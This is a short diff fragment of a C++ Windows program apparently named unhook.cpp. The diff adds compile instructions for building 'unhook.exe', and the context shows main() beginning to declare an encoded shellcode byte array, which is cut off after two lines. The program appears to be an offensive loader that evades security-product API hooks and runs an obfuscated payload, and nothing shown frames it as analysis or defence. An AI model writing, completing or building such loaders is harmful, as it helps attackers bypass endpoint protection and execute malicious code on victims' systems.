@@ -4,6 +4,9 @@
 #include <psapi.h>
 #pragma comment(lib, "psapi.lib")
 
+//Compile: x86_64-w64-mingw32-g++ -o unhook.exe -L <psapi.h path> unhook.cpp -l psapi -static
+//Windows compile: cl.exe /EHsc unhook.cpp (maybe)
+
 int main() {
 	unsigned char shellcode[] = "\xc9\x7d\xb6\xd1\xc5\xdd\xf9\x35\x35\x35\x74\x64\x74\x65\x67"
 "\x7d\x04\xe7\x50\x7d\xbe\x67\x55\x64\x63\x7d\xbe\x67\x2d\x7d"
